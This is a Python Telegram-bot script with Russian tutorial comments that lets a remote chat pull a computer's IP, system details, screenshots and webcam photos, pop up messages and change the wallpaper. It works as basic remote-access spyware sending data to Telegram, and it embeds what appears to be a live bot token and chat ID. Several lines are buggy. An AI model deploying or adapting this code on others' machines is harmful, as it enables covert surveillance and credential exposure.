#БОТ с помощью которого можно бдует управлять компьюетром

#импортируем библиотеки
import telebot
from telebot import types
import requests #получения IP адресса
import cv2 #получение изображения с веб-камеры
import ctypes #изменение фона рабочего стола
import pyautogui as pag #для получаения изображения с экрана, ввод сообщения на экран, ввод сообщения на экран с возможностью ответа
import platform as pf
import os #для получения абсолютного пути к файлу

TOKEN = "5293054411:AAEklRb8T28_kmdPmbNbHXyp1UMLDilSzwc"
CHAT_ID = "1235221720" #пишем 'Show json Bot' любое сообщение, в ответ получаем данные о сообщении, там же будет ChatID
client = telebot.TeleBot(TOKEN)

requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}text=Online") #вводим сообщение при запуске кода, ссылка универсальная, в кфигурных скобках прописваем данные бота, text=наша фраза, которую хотим ввыодить

#создаем команды


@client.message_handler(commands=["start"])
def start(message):
    rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btns = ["/ip", "/spec", "/screenshot", "/webcam", "/message", "/input", "/wallpaper"]

    for btn in btns: #создали цикл для добавления кнопок в клавиатуру
        rmk.add(types.KeyboardButton(btn))

    client.send_message(message.chat.id, "Выберите действие:", reply_markup=rmk)

#IP
@client.message_handler(commands=["ip", "ip_address"]) #добавили 2 команды, можно добавлять множество комнад
def ip_adress(message):
    response = requests.get("http://jsonip.com/").json() #получение IP адресса, всегда так пишем
    client.send_message(message.chat.id, f"IP Adress: {response['ip']}") #мы получили json объект в предыдущей строке, а в Питоне это просто слварь, то пишем ключ 'ip' для получения адресса пользователя и выводаего на экран

#характеристики устройства
@client.message_handler(commands=["spec", "specifications"])
def spec(message):
    #используем библиотеку platform для вывода характеристик
    msg = f"Name PC: {pf.node()}\nProcessor: {pf.processor()}\nSystem: {pf.system()} {pf.release()}" #{pf.node()} - вывод сетевого имени компьюетра, {pf.processor()} = процессор, {pf.system() - систему, {pf.release()} - верися системы. /n - переход на новую строку
    client.send_message(message.chat.id, msg) #выводим данные

#скриншот
@client.message_handler(commands=["screenshot"])
def screenshot(message):
    #с помощью модуля pyautogu
    pag.screenshot("000.jpg") #делаем скрин и даем ему желаемое название

    with open("000.jpg", "rb") as img: #с помощью конуструкции with open открываем скриншот. Указываем название файла и указываем метод rb. в конце называем эту конструкцию img
        client.send_photo(message.chat.id, img) #пишем это для того чтобы вывести каку-либо фотографию от имени бота

#вебкамера
@client.message_handler(commands=["webcam"])
def webcam(message):
    cap = cv2.VideoCapture(0) #указваем первую веб-камеру

    #"прогреваем" камеру,для более четкого качества
    for i in range(30):
        cap.read()

    ret, frame = cap.read() #cap.read() создаем список и разделяет его по двум переменным ret, frame
    #воспользуемся функцией imwrite
    cv2.imwrite("cam", frame) #пишем имя нашего файла, желатнльно в jpg, и пишем имя 2 нашей переменной. Почему не пишем имя 1 переменной? Т.к. список разделятся на 2 переменные, а нам нужна только 2 переменная.  Но это не точно.
    cap.release()

    with open("cam", "rb") as img: #с помощью конуструкции with open открываем скриншот. Указываем название файла и указываем метод rb. в конце называем эту конструкцию img
        client.send_photo(message.chat.id, img) #пишем это для того чтобы вывести каку-либо фотографию от имени бота

#сообщение
@client.message_handler(commands=["message"])
def message_sending(message):
    msg = client.send_message(message.chat, "Введите ваше сообщение, которое желаете вывести на экран.")
    #создаем пошаговый обработчик, если щабыл что это такое, посмотри программу "пошаговый обработчик"
    client.register_next_step_handler(msg, next_message_sending)

def next_message_sending(message):
    #воспользуемся pyautogui
    try:
        pag.alert(message.text, "-") #alert - для отправки сообещния. указываем 1ым оснонвной текст, а дальше дюбой заголовок нашего окна
    except Exception:
        client.send_message(message.chat.id, "Что-то пошло не так...")
    #сообещние придейт только тогда когда, пользователь нажмет кнопку окей

#сообещение с возможностью отправки собщения с ответом о
@client.message_handler(commands=["input"])
def message_sending_input(message):
    msg = client.send_message(message.chat, "Введите ваше сообщение, которое желаете вывести на экран.")
    # создаем пошаговый обработчик, если щабыл что это такое, посмотри программу "пошаговый обработчик"
    client.register_next_step_handler(msg, next_message_sending_with_input())


def next_message_sending_with_input(message):
    # воспользуемся pyautogui
    try:
        answer = pag.promt(message.text, "-")  #promt - для отправки сообщения с возомжнотсью получения ответа. указываем 1ым оснонвной текст, а дальше дюбой заголовок нашего окна
        client.send_message(message.chat.id, answer) #когда пользвоатель напишет текст и нажмет okey, то его текст прилетит к нам в телеграмм
    except Exception:
        client.send_message(message.chat.id, "Что-то пошло не так...")
    # сообещние придейт только тогда когда, пользователь нажмет кнопку окей


#смена обоев
@client.message_handler(commands=["wallpaper"])
def wallpaper(message):
    msg = client.send_message(message.chat.id, "Отправьте картинку")
    client.register_next_step_handler(msg, next_wallpaper)

@client.message_handler(content_types=["photo"])
def next_wallpaper(message):
        file = message.photo[-1].file_id #получаем от полученнного файла его ID. Пишем всегда так переменная = message.photo[-1].file_id
        file = client.get_file(file) #перезаписваем переменную file
        dfile = client.download_file(file.file_path)

        with open("image.jpg", "wb") as img: #открываем файл, image.jpg - название сохраняемого файла, "wb" - всегда пишем так
            img.write(dfile) #скачали фотографию

        #воспользуемся библиотекой os для того чтобы узнать абсолютный путь к фотографии
        path = os.path.abspath("image.jpg") #получили аболютный путь к картинке. path = os.path.abspath, path - имя переменной, которую потом мы казваем между os.-сюда-.abspath. image.jpg - имя полученного файла(может быть любым в формате jpg
        #библиотека ctypes
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0) #трудно объяснить, сам не очень понял, но понятно одно, что path мы пишем для путя до файла


client.polling(none_stop = True, interval = 0)
